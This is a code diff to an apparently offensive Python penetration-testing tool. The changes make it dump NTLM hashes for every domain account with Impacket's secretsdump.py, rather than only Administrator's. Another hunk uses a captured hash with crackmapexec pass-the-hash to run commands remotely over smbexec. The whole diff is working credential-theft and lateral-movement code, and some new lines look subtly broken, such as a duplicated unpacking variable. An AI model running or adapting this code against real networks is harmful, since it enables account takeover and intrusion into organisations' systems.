@@ -1290,21 +1290,22 @@ while True:
       os.remove("SECRETS.tmp")
       os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
       command("cat SECRETS.tmp")
-      os.system("sed -i -n '/Administrator/p' SECRETS.tmp")	# SELECT ONLY ADMINISTRATOR
-      HASH = linecache.getline('SECRETS.tmp', 1)
-      HASH = HASH.replace (":"," ")
-      HASH = HASH.rstrip(" ")
-      os.system("echo '" + HASH.rstrip(" ") + "' >> SECRETS2.tmp")
-      os.system("awk 'NF>1{print $NF}' < SECRETS2.tmp > HASH.tmp")
+      os.system("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
       os.remove("SECRETS2.tmp")
-      HASH = linecache.getline('HASH.tmp', 1)
-      os.system("mv HASH.tmp SECRETS.tmp")
-      HASH = HASH.rstrip("\n")
-      HASH = padding(HASH, COL4)
+      os.system("cat SECRETS.tmp | wc -l > count.txt")
+      count = linecache.getline("count.txt", 1)
+      count2 = int(count)
+      os.remove("count.txt")
 
-      for x in range (0,MAX):
-         if US[x].rstrip(" ") == "Administrator":
-            PA[x] = HASH
+      for x in range(0,count2):
+         test = linecache.getline("SECRETS.tmp",x+1)
+         test = test.replace(":::","")
+         test = test.replace(HST.rstrip(" ")+"\\","")
+         get1,get2,get3,get3 = test.split(":")
+         get3 = padding(get3,COL4) 
+         for x in range (0,MAX):
+            if US[x].rstrip(" ") == get1:
+               PA[x] = get3
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1318,12 +1319,12 @@ while True:
       command("crackmapexec -u users.txt -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" "))
       HASHED = "................................"
       for x in range (0,MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):
+         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASHED = PA[x].rstrip(" ")
       if HASHED != "................................":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASHED + " -x 'net user Administrator /domain' --exec-method smbexec")
       else:
-         command("echo 'No hash value enumerated for " + POR.rstrip(" ") + "...'")
+         command("echo 'No hash value found for " + POR.rstrip(" ") + "...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
